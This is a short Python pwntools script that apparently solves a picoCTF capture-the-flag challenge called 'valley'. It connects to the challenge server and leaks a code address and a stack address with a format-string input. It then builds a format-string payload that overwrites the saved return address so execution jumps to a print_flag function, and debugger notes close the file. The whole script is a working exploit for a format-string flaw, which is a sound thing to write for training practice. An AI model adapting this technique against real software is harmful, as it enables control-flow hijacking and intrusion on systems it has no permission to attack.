from pwn import *

context.binary = elf = ELF("./valley")
context.terminal = ['xfce4-terminal', '-e']
#context.log_level = 'debug'
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        p = gdb.debug([elf.path],'''
            b *echo_valley+201
            continue
        ''')
else:
    #p = process()
    p = remote('shape-facility.picoctf.net',61179)

p.sendline(b'%21$p..%20$p')
p.recvuntil(b'distance: ')
a = p.recv().split(b'..')
print(a)
elf.address = int(a[0].strip(),16) - 0x1413
ret = int(a[1].strip(),16) + 8
#ret = int(a[1],16)
success(f'leak pie {hex(elf.address)}')
success(hex(ret))
#aw = 0x7fffffffd938

payload = fmtstr_payload(6, {ret: elf.sym.print_flag},write_size='short')
p.sendline(payload)
p.sendline(b'exit') # to trigger win function
p.interactive()

# pwndbg> x $rbp
# 0x7fffffffd900: 0xffffd910
# pwndbg> x/gx $rbp
# 0x7fffffffd900: 0x00007fffffffd910
# pwndbg> x 0x00007fffffffd910
# 0x7fffffffd910: 0x0000000000000001
# pwndbg>
# 0x7fffffffd918: 0x00007ffff7de8d68
# pwndbg> x 0x00007ffff7de8d68
# 0x7ffff7de8d68